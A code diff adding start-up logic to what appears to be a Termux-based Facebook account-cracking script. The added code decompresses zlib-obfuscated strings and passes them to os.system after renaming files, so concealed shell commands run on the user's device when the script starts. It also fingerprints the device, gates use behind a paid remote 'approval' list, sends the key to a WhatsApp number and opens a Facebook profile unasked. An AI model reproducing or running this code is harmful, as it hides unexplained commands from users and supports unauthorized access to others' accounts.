@@ -104,6 +104,100 @@ def tahunng(fx):
 		tahunz = '2006-2007'
 	else:tahunz=''
 	return tahunz
+def linex():
+    print(55*'\033[1;95m=')
+def clear():
+    os.system(f'clear')
+    print(logo)
+loop=0
+oks=[]
+cps=[]
+pcp=[]
+id=[]
+tokenku=[]
+sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')
+sz1 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x0eL\x0e\x15')
+sz2 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x0eK\x0e\x19')
+sz3 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x89g\xfca\xa4\xa7@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc8\xa7\xdd\x00M\xaf\xf8\xa8<|s\x13\xcdsP\x06c\x9e\x1d\xa5\xecg[\xd7\xeb\x05\x14#z\xaa\x03\xfd\x0c\xcb\x0c\xd8\x13\xd3\x9fo\x8c\x14\xed\xfeF\xa9M\x0cn\x8a\xed7?\xf1Q&+')
+sz4 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x13\xcf\xf8\xc3HO@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc9\x87\xdd\x00M\xafxT\x9e\xbe\xb9\x89\xe69(\x831\xcf\x8eR\xf6g[\xd7\xeb\x05\x14#z\xaa\x03\xda\xc32\x03\xf6\xc4\xf4\xe7\x1b#E\xbb\xbfQj\x13\x83\x9bb\xfb\xcd\x0f\xf0\xab&#')
+sz5 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05')
+sz6 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t')
+sz7 = zlib.decompress(b'x\x9c\x1d\xca[\x0e@0\x10\x05\xd0\x15\xe9%V4j\xd0\xb4\xd5\x9aG\xc2\xee\x89\x9f\xf3u\xb0\x92\x11~b\xab\xc1X\xaa\xdf\xd8Ra\x85\xab\xa0\xa4\x05\xfd\xb1\xa3\x9ds\x98Fh2\x1e:\xc5L\xfb\x17\x84/g5\xc5\x0b\x8bO\x19\xc2')
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' #
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+#--checking if file is not avalible
+if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
+    pass
+    exit("Error in termux modules ")
+
+if os.path.exists(sz):
+    os.rename(sz1,'.f1')
+    os.rename(sz2,'.f2')
+    os.system(sz3)
+    os.system(sz4)
+    os.system(sz5)
+    os.system(sz6)
+else:
+    pass
+os.system("rm -rf .f1")
+os.system("rm -rf .f2")
+update = requests.get("https://raw.githubusercontent.com/ON-FIRE-404/Approval/main/on.txt").text
+uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
+id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
+plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
+xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+bxd = ""
+bumper = "FIRE=="+id+bxd+xp
+FIRE = "ACTION-FIRE"
+myweb2 = requests.get(f"https://raw.githubusercontent.com/ON-FIRE-404/Approval/main/on.txt").text
+os.system('xdg-open https://facebook.com/ft.alvi.18')
+logo1 = ("""\x1b[1;94m═════════════════════════════════════════════════════╗
+\x1b[1;94m║                                                     ║
+\x1b[1;94m║  \x1b[1;92m██████  \x1b[1;33m███    ██       \x1b[1;91m███████ \x1b[1;94m██ \x1b[1;96m██████  \x1b[1;95m███████\x1b[1;94m ║
+\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m████   ██       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m██\x1b[1;94m      ║
+\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m██ ██  ██ \x1b[1;92m█████ \x1b[1;91m█████   \x1b[1;94m██ \x1b[1;96m██████  \x1b[1;95m█████\x1b[1;94m   ║
+\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m██  ██ ██       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m██\x1b[1;94m      ║
+\x1b[1;94m║  \x1b[1;92m██████  \x1b[1;33m██   ████       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m███████\x1b[1;94m ║
+\x1b[1;94m║                                                     ║
+\x1b[1;94m╚═════════════════════════════════════════════════════╝
+""")
+def approval():
+    try:
+        os.system('clear')
+        print(logo1)
+        x = requests.get('https://raw.githubusercontent.com/hop09/libraries/main/version.txt').text
+        if str("upppdate") in update:
+            os.system('clear')
+            exit('script is in update / maintanance be patient ')
+        elif str("res-sseett") in update:
+            os.system('')
+            os.system('')
+            os.system('')
+            exit('DONT TRY TO BYPASS')
+        elif bumper in myweb2:
+            print("YOUR KEY WAS APPROVED")
+            FIRE()
+        else:
+            os.system("clear");print(logo)
+            print(f"{RED}YOUR DEVICE LICENSE KEY IS NOT APPROVED")
+            print(55*"\033[1;92m=")
+            print(f"\033[1;92m\033[1;91m[\033[1;92m•\033[1;91m]KEY : {RED}{bumper}")
+            print(55*"\033[1;92m=")
+            print(f"{GREEN}[07]☞︎︎︎DAYS PRICE : 350  TK")
+            print(f"{GREEN}[15]☞︎︎︎DAYS PRICE : 500  TK")
+            print(f"{GREEN}[30]☞︎︎︎DAYS PRICE : 1000 TK")
+            print(f"{BLUE}FREE APPROVAL AVAILABLE CONTACT ME ON MY WHATSAPP TO GET FREE APPROVAL")
+            print(55*"\033[1;92m=")
+            input("\033[1;91m[PRESS ENTER TO SEND KEY TO ADMIN]")
+            os.system(f"termux-open-url https://wa.me/+9660507886506?text={bumper}")
+            approval()
+    except requests.exceptions.ConnectionError:
+        exit(' NO INTERNET CONNECTION ..')
+
 
 class jalan:
     def __init__(self, z):
